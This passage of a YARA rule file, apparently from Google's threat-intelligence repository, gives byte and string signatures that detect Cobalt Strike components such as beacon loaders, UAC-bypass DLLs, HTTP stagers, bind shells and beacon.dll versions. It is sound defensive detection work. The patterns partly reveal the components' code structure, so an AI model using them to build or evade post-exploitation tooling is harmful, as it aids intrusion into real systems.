		id = "38e063db-3d76-5a94-812a-945fcf46a232"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L326-L374"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "9d5b6ccd0d468da389657309b2dc325851720390f9a5f3d3187aff7d2cd36594"
		logic_hash = "6224000342d87041fd3336656897479c644e94ea36fc061c27fcd64233047c2c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 44 24 58 4D
      C6 44 24 59 61
      C6 44 24 5A 70
      C6 44 24 5B 56
      C6 44 24 5C 69
      C6 44 24 5D 65
      C6 44 24 5E 77
      C6 44 24 5F 4F
      C6 44 24 60 66
      C6 44 24 61 46
      C6 44 24 62 69
      C6 44 24 63 6C
      C6 44 24 64 65
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_VA_X64_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.VA.x64.o (VirtualAlloc) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "8ca04f82-a8a8-5162-8b0c-8a7bce678a85"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L376-L456"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ac090a0707aa5ccd2c645b523bd23a25999990cf6895fce3bfa3b025e3e8a1c9"
		logic_hash = "17402e952d71d02274a9b2814512b28a402e8d11a6c2a2375844fe24719f87a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      C6 44 24 48 56
      C6 44 24 49 69
      C6 44 24 4A 72
      C6 44 24 4B 74
      C6 44 24 4C 75
      C6 44 24 4D 61
      C6 44 24 4E 6C
      C6 44 24 4F 41
      C6 44 24 50 6C
      C6 44 24 51 6C
      C6 44 24 52 6F
      C6 44 24 53 63
      C6 44 24 54 00
    }
		$deobfuscator = {
      8B 04 24
      FF C0
      89 04 24
      8B 44 24 28
      39 04 24
      73 20
      8B 04 24
      0F B6 4C 24 30
      48 8B 54 24 20
      0F BE 04 02
      33 C1
      8B 0C 24
      48 8B 54 24 20
      88 04 0A
    }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Sleeve_Beaconloader_X64_O_V4_3_V4_4_V4_5_And_V4_6
{
	meta:
		description = "Cobalt Strike's sleeve/BeaconLoader.x64.o (Base) Versions 4.3 through at least 4.6"
		author = "gssincla@google.com"
		id = "07f751e4-f001-5b95-b229-31fbaa867cea"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Sleeve_BeaconLoader_all.yara#L458-L555"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ac090a0707aa5ccd2c645b523bd23a25999990cf6895fce3bfa3b025e3e8a1c9"
		logic_hash = "50d9da466e2c074b3fb634203c8840d45da8f8e3094790d7c4354a5703b583ef"
		score = 75
		quality = 85
		tags = ""

	strings:
		$core_sig = {
      33 C0
      83 F8 01
      74 63
      48 8B 44 24 20
      0F B7 00
      3D 4D 5A 00 00
      75 45
      48 8B 44 24 20
      48 63 40 3C
      48 89 44 24 28
      48 83 7C 24 28 40
      72 2F
      48 81 7C 24 28 00 04 00 00
      73 24
      48 8B 44 24 20
      48 8B 4C 24 28
      48 03 C8
      48 8B C1
      48 89 44 24 28
      48 8B 44 24 28
      81 38 50 45 00 00
      75 02
    }
		$deobfuscator = {
      8B 04 24
      FF C0
      89 04 24
      8B 44 24 28
      39 04 24
      73 20
      8B 04 24
      0F B6 4C 24 30
      48 8B 54 24 20
      0F BE 04 02
      33 C1
      8B 0C 24
      48 8B 54 24 20
      88 04 0A
    }

	condition:
		$core_sig and not $deobfuscator
}

rule GCTI_Cobaltstrike_Resources_Elevate_X64_Dll_V3_0_To_V3_14_And_Sleeve_Elevate_X64_Dll_V4_X
{
	meta:
		description = "Cobalt Strike's resources/elevate.x64.dll signature for v3.0 to v3.14 and sleeve/elevate.x64.dll for v4.x"
		author = "gssincla@google.com"
		id = "91d5c343-1084-5cfc-9dfa-46f530eb9625"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Elevate_X64_Dll_v3_0_to_v3_14_and_Sleeve_Elevate_X64_Dll_v4_x.yara#L17-L71"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "c3ee8a9181fed39cec3bd645b32b611ce98d2e84c5a9eff31a8acfd9c26410ec"
		logic_hash = "6f23bcf6a0c360d2f83140ce633440b13d8b691e75c5560c65656cf8a6114224"
		score = 75
		quality = 85
		tags = ""

	strings:
		$wnd_proc = {
			81 ?? 21 01 00 00
			75 ??
			83 [5] 00
			75 ??
			45 33 ??
			8D [2]
			C7 [5] 01 00 00 00
			45 [2] 28
			FF 15 [4]
			45 33 ??
			8D [2]
			45 [2] 27
			48 [2]
			FF 15 [4]
			45 33 ??
			45 33 ??
			BA 01 02 00 00
			48 
		}

	condition:
		$wnd_proc
}

rule GCTI_Cobaltstrike_Resources_Bypassuac_X64_Dll_V3_3_To_V3_14_And_Sleeve_Bypassuac_X64_Dll_V4_0_And_V4_X
{
	meta:
		description = "Cobalt Strike's resources/bypassuac-x64.dll from v3.3 to v3.14 (64-bit version) and sleeve/bypassuac.x64.dll from v4.0 to at least v4.4"
		author = "gssincla@google.com"
		id = "eef83901-63d9-55a3-b115-03f420416177"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bypassuac_x64_Dll_v3_3_to_v3_14_and_Sleeve_Bypassuac_x64_Dll_v4_0_and_v4_x.yara#L17-L86"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "9ecf56e9099811c461d592c325c65c4f9f27d947cbdf3b8ef8a98a43e583aecb"
		logic_hash = "d76e3601f61ae164a8df9048d59d15cd6913e64adb93132244e83f40bf67d86a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$deleteFileCOM = {
			48 8B [5]
			45 33 ??
			48 8B ??
			FF 90 90 00 00 00
			85 C0
			75 ??
			48 8B [5]
			48 8B ??
			FF 92 A8 00 00 00
			85 C0
		}
		$copyFileCOM = {
			48 8B [5]
			4C 8B [5]
			48 8B [5]
			48 8B ??
			4C 8B ??
			48 89 [3]
			FF 90 80 00 00 00
			85 C0
			0F 85 [4]
			48 8B [5]
			48 8B 11
			FF 92 A8 00 00 00
		}

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Covertvpn_Injector_Exe_V1_44_To_V2_0_49
{
	meta:
		description = "Cobalt Strike's resources/covertvpn-injector.exe signature for version v1.44 to v2.0.49"
		author = "gssincla@google.com"
		id = "48485ae2-1d99-5fa8-b8e8-0047e92ef447"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Covertvpn_injector_Exe_v1_44_to_v2_0_49.yara#L17-L116"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d741751520f46602f5a57d1ed49feaa5789115aeeba7fa4fc7cbb534ee335462"
		logic_hash = "119602efe6243d8c0dc7b8f4468eb9b3be292620920f69dc8a560f900ac7f622"
		score = 75
		quality = 85
		tags = ""

	strings:
		$dropComponentsAndActivateDriver_prologue = {
			C7 04 24 [4]
			E8 [4]
			83 EC 04
			C7 44 24 04 [4]
			89 04 24
			E8 59 14 00 00
			83 EC 08
			89 45 ?? 
			83 7D ?? 00 
			74 ?? 
			E8 [4]
			8D [2]
			89 [3]
			89 04 24
		}
		$dropFile = {
			C7 44 24 04 00 00 00 00
			8B [2]
			89 ?? 24 
			E8 [4]
			83 F8 FF
			74 ?? 
			8B [2]
			89 ?? 24 04 
			C7 04 24 [4]
			E8 [4]
			E9 [4]
			C7 44 24 18 00 00 00 00
			C7 44 24 14 80 01 00 00
			C7 44 24 10 02 00 00 00
			C7 44 24 0C 00 00 00 00
			C7 44 24 08 05 00 00 00
			C7 44 24 04 00 00 00 40
			8B [2]
			89 04 24
			E8 [4]
			83 EC 1C
			89 45 ?? 
		}
		$nfp = "npf.sys" nocase
		$wpcap = "wpcap.dll" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Artifact32_And_Resources_Dropper_V1_49_To_V3_14
{
	meta:
		description = "Cobalt Strike's resources/artifact32{.exe,.dll,big.exe,big.dll} and resources/dropper.exe signature for versions 1.49 to 3.14"
		author = "gssincla@google.com"
		id = "243e3761-cbea-561c-97da-f6ba12ebc7ee"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara#L17-L32"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "40fc605a8b95bbd79a3bd7d9af73fbeebe3fada577c99e7a111f6168f6a0d37a"
		logic_hash = "437706c808bca28384a6e8e24fa3ae120a4ebe4166fa4ca3564c58b881fb23a8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$payloadDecoder = { 8B [2] 89 ?? 03 [2] 8B [2] 03 [2] 0F B6 18 8B [2] 89 ?? C1 ?? 1F C1 ?? 1E 01 ?? 83 ?? 03 29 ?? 03 [2] 0F B6 00 31 ?? 88 ?? 8B [2] 89 ?? 03 [2] 8B [2] 03 [2] 0F B6 12 }

	condition:
		any of them
}

rule GCTI_Cobaltstrike_Resources_Artifact32_V3_1_And_V3_2
{
	meta:
		description = "Cobalt Strike's resources/artifact32{.dll,.exe,svc.exe,big.exe,big.dll,bigsvc.exe} and resources/artifact32uac(alt).dll signature for versions 3.1 and 3.2"
		author = "gssincla@google.com"
		id = "4fff7f42-9f50-5945-8ec0-2438ac5c7000"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara#L34-L60"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "4f14bcd7803a8e22e81e74d6061d0df9e8bac7f96f1213d062a29a8523ae4624"
		logic_hash = "7a0d33d0260c762b4aa67e4084d7474338c60aa684fd3e622614745d90350da8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$decoderFunc = { 89 ?? B? 04 00 00 00 99 F7 FF 8B [2] 8A [2] 30 ?? 8A ?? 4? 88 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Artifact32_V3_14_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/artifact32{.dll,.exe,big.exe,big.dll,bigsvc.exe} signature for versions 3.14 to 4.x and resources/artifact32svc.exe for 3.14 to 4.x and resources/artifact32uac.dll for v3.14 and v4.0"
		author = "gssincla@google.com"
		id = "8a010305-dce5-55f4-b2dd-a736721efe22"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara#L62-L89"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "888bae8d89c03c1d529b04f9e4a051140ce3d7b39bc9ea021ad9fc7c9f467719"
		logic_hash = "fc5c353c568e33df80fa5bab14d11112ca211e269043b83dba8b7d1a6a008a7b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$pushFmtStr = {	C7 [3] 5C 00 00 00 C7 [3] 65 00 00 00 C7 [3] 70 00 00 00 C7 [3] 69 00 00 00 C7 [3] 70 00 00 00 F7 F1 C7 [3] 5C 00 00 00  C7 [3] 2E 00 00 00 C7 [3] 5C 00 00 00 }
		$fmtStr = "%c%c%c%c%c%c%c%c%cMSSE-%d-server"

	condition:
		all of them
}

rule GCTI_Cobaltstrike__Resources_Browserpivot_Bin_V1_48_To_V3_14_And_Sleeve_Browserpivot_Dll_V4_0_To_V4_X
{
	meta:
		description = "Cobalt Strike's resources/browserpivot.bin from v1.48 to v3.14 and sleeve/browserpivot.dll from v4.0 to at least v4.4"
		author = "gssincla@google.com"
		id = "55086544-6684-526b-914f-505a562be458"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Browserpivot_Bin_v1_48_to_v3_14_and_Sleeve_Browserpivot_Dll_v4_0_to_v4_x.yara#L17-L60"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "12af9f5a7e9bfc49c82a33d38437e2f3f601639afbcdc9be264d3a8d84fd5539"
		logic_hash = "416554d31c105fd96aeaef508847efe2889590909c8d0025e3862e5b24078131"
		score = 75
		quality = 85
		tags = ""

	strings:
		$socket_recv = {
			FF [1-5]
			83 ?? FF 
			74 ?? 
			85 C0
			(74 | 76) ?? 
			03 ?? 
			83 ?? 02 
			72 ?? 
			80 ?? 3E FF 0A 
			75 ?? 
			80 ?? 3E FE 0D 
		}
		$fmt = "%1024[^ ] %8[^:]://%1016[^/]%7168[^ ] %1024[^ ]"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Httpsstager64_Bin_V3_2_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/httpsstager64.bin signature for versions v3.2 to v4.x"
		author = "gssincla@google.com"
		id = "c16e73fc-484a-5f7e-8127-d85a0254d842"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Httpsstager64_Bin_v3_2_through_v4_x.yara#L17-L90"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "109b8c55816ddc0defff360c93e8a07019ac812dd1a42209ea7e95ba79b5a573"
		logic_hash = "4889a23c1f2780044b9fb2a0207676d57e82e6c1275614b684a5a9cbe984b761"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			48 [2]
			AC
			41 [2] 0D
			41 [2]
			38 ??
			75 ??
			4C [4]
			45 [2]
			75 ??
			5?
			44 [2] 24
			49 [2]
			66 [4]
			44 [2] 1C
			49 [2]
			41 [3]
			48 
		}
		$InternetSetOptionA = {
			BA 1F 00 00 00
			6A 00
			68 80 33 00 00
			49 [2]
			41 ?? 04 00 00 00
			41 ?? 75 46 9E 86
		}

	condition:
		$apiLocator and $InternetSetOptionA
}

rule GCTI_Cobaltstrike_Resources_Bypassuactoken_X64_Dll_V3_11_To_V3_14
{
	meta:
		description = "Cobalt Strike's resources/bypassuactoken.x64.dll from v3.11 to v3.14 (64-bit version)"
		author = "gssincla@google.com"
		id = "c89befcd-a622-5947-9ce3-a6031901a45a"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bypassuactoken_x64_Dll_v3_11_to_v3_14.yara#L17-L118"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "853068822bbc6b1305b2a9780cf1034f5d9d7127001351a6917f9dbb42f30d67"
		logic_hash = "adfd212f2e470f666ab8a2168e976c11d3032c31dab7cf56963dae5fc0f6c5f9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$isHighIntegrityProcess = {
			83 ?? 7A
			75 ??
			8B [3]
			33 ??
			FF 15 [4]
			44 [4]
			8D [2]
			48 8B ??
			48 8D [3]
			48 8B ??
			4C 8B ??
			48 89 [3]
			FF 15 [4]
			85 C0
			74 ??
			48 8B ??
			FF 15 [4]
			8D [2]
			8A ??
			40 [2]
			0F B6 D1
			48 8B 0F
			FF 15 [4]
			81 ?? 00 30 00 00
		}
		$executeTaskmgr = {
			44 8D ?? 70
			48 8D [3]
			E8 [4]
			83 [3] 00
			48 8D [5]
			0F 57 ??
			66 0F 7F [3]
			48 89 [3]
			48 8D [5]
			48 8D [3]
			C7 [3] 70 00 00 00
			C7 [3] 40 00 00 00
			48 89 [3]
			FF 15 
		}

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Bind64_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/bind64.bin signature for versions v2.5 to v4.x"
		author = "gssincla@google.com"
		id = "a01e7bc3-40e9-5f87-8fd6-926972be273b"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Bind64_Bin_v2_5_through_v4_x.yara#L17-L109"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "5dd136f5674f66363ea6463fd315e06690d6cb10e3cc516f2d378df63382955d"
		logic_hash = "ba79abc5cfeaccb94699c0d85c16b2ddf6820bc148c0fd1c9b33c07222e36cb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			48 [2]
			AC
			41 [2] 0D
			41 [2]
			38 ??
			75 ??
			4C [4]
			45 [2]
			75 ??
			5?
			44 [2] 24
			49 [2]
			66 [4]
			44 [2] 1C
			49 [2]
			41 [3]
			48 
		}
		$calls = {
			41 BA C2 DB 37 67
			FF D5
			48 [2]
			48 [2]
			41 BA B7 E9 38 FF
			FF D5
			4D [2]
			48 [2]
			48 [2]
			41 BA 74 EC 3B E1
			FF D5
			48 [2]
			48 [2]
			41 BA 75 6E 4D 61
		}

	condition:
		$apiLocator and $calls
}

rule GCTI_Cobaltstrike_Resources_Httpstager_Bin_V2_5_Through_V4_X
{
	meta:
		description = "Cobalt Strike's resources/httpstager.bin signature for versions 2.5 to 4.x"
		author = "gssincla@google.com"
		id = "86109485-c26c-5c51-8d04-dd1add9a8c57"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Httpstager_Bin_v2_5_through_v4_x.yara#L17-L93"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "a47569af239af092880751d5e7b68d0d8636d9f678f749056e702c9b063df256"
		logic_hash = "3baab08b0118e00432f1869ba5daa4fc6383bfc020119bfbb3047a008c33fe72"
		score = 75
		quality = 85
		tags = ""

	strings:
		$apiLocator = {
			31 ?? 
			AC
			C1 ?? 0D 
			01 ?? 
			38 ?? 
			75 ?? 
			03 [2]
			3B [2]
			75 ?? 
			5? 
			8B ?? 24 
			01 ?? 
			66 8B [2]
			8B ?? 1C 
			01 ?? 
			8B ?? 8B 
			01 ?? 
			89 [3]
			5? 
			5? 
		}
		$downloaderLoop = {
			B? 00 2F 00 00 
			39 ?? 
			74 ?? 
			31 ?? 
			( E9 | EB )
		}

	condition:
		$apiLocator and $downloaderLoop
}

rule GCTI_Cobaltstrike_Resources_Xor_Bin__64Bit_V3_12_To_V4_X
{
	meta:
		description = "Cobalt Strike's resource/xor64.bin signature for version 3.12 through 4.x"
		author = "gssincla@google.com"
		id = "5bb465ee-3bbd-5bfe-8b63-1f243de217bc"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Xor_Bin__64bit_v3_12_to_4_x.yara#L17-L38"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "01dba8783768093b9a34a1ea2a20f72f29fd9f43183f3719873df5827a04b744"
		logic_hash = "aabaad09408ae292a0bbc678c334f9f54364b4f6b882846072c303bf826fc2da"
		score = 75
		quality = 85
		tags = ""

	strings:
		$stub58 = {fc e8 ?? ?? ?? ?? [1-32] eb 33 5? 8b ?? 00 4? 83 ?? ?4 8b ?? 00 31 ?? 4? 83 ?? ?4 5? 8b ?? 00 31 ?? 89 ?? 00 31 ?? 4? 83 ?? ?4 83 ?? ?4 31 ?? 39 ?? 74 ?2 eb e7 5? fc 4? 83 ?? f0 ff}
		$stub59 = {fc e8 ?? ?? ?? ?? [1-32] eb 2e 5? 8b ??    48 83 c? ?4 8b ??    31 ?? 48 83 c? ?4 5? 8b ??    31 ?? 89 ??    31 ?? 48 83 c? ?4 83 e? ?4 31 ?? 39 ?? 74 ?2 eb e9 5?    48 83 ec ?8 ff e? e8 cd ff ff ff}
		$stub63 = {fc e8 ?? ?? ?? ?? [1-32] eb 32 5d 8b ?? ?? 48 83 c5 ?4 8b ?? ?? 31 ?? 48 83 c5 ?4 55 8b ?? ?? 31 ?? 89 ?? ?? 31 ?? 48 83 c5 ?4 83 e? ?4 31 ?? 39 ?? 74 ?2 eb e7 5?    48 83 ec ?8 ff e? e8 c9 ff ff ff}

	condition:
		any of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_44
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.44"
		author = "gssincla@google.com"
		id = "935ee27f-ce1b-5491-b4a3-cb78f199ab1b"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L17-L49"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "75102e8041c58768477f5f982500da7e03498643b6ece86194f4b3396215f9c2"
		logic_hash = "ebed8b6dc0b929164b1aa25b491b9d2fbb61d380a8b1268df7d424afe90f613d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 0F B7 D2 4A 53 8B D9 83 FA 04 77 36 FF 24 }
		$decode = { B1 ?? 30 88 [4] 40 3D 28 01 00 00 7C F2 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_45
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.45"
		author = "gssincla@google.com"
		id = "04d4d0ee-f1ee-5888-8108-ca55243c770a"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L51-L84"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "1a92b2024320f581232f2ba1e9a11bef082d5e9723429b3e4febb149458d1bb1"
		logic_hash = "b1472907e0fe0cb26219c268f23483681cc076dab96c1b0f2f0ee472ad319b4f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 51 0F B7 D2 4A 53 56 83 FA 08 77 6B FF 24 }
		$decode = { B1 ?? 30 88 [4] 40 3D 28 01 00 00 7C F2 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_46
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.46"
		author = "gssincla@google.com"
		id = "79715042-1963-5e48-8b64-7d915da58d84"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L86-L115"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "44e34f4024878024d4804246f57a2b819020c88ba7de160415be38cd6b5e2f76"
		logic_hash = "1a5c63c8b5527c0442830a73ded8458cf82a9d8ecb9b31e9a02c10b27ed6195e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 8B F2 83 F9 0C 0F 87 8E 00 00 00 FF 24 }
		$decode = { B1 ?? 30 88 [4] 40 3D A8 01 00 00 7C F2 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_47
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.47"
		author = "gssincla@google.com"
		id = "ac2249a9-210c-581f-8dd1-7619356dca7d"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L117-L144"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "8ff6dc80581804391183303bb39fca2a5aba5fe13d81886ab21dbd183d536c8d"
		logic_hash = "8c463d3122f3f79ff5d9b88e3d4f5ed14e6c581edfdfafba8a0c596c494ac1b1"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 83 F8 12 77 10 FF 24 }
		$decode = { B1 ?? 30 88 [4] 40 3D A8 01 00 00 }

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Beacon_Dll_V1_48
{
	meta:
		description = "Cobalt Strike's resources/beacon.dll Version 1.48"
		author = "gssincla@google.com"
		id = "dd15099f-ad19-58df-9ed4-ce66d7ee8540"
		date = "2022-11-18"
		modified = "2023-12-04"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Beacon_Dll_All_Versions_MemEnabled.yara#L146-L178"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "dd4e445572cd5e32d7e9cc121e8de337e6f19ff07547e3f2c6b7fce7eafd15e4"
		logic_hash = "3f789eaf334c9bb3236d2834f38156aa92b22a5b674450977086378d195dd216"
		score = 75
		quality = 85
		tags = ""

	strings:
		$version_sig = { 48 57 8B F1 8B DA 83 F8 17 77 12 FF 24 }
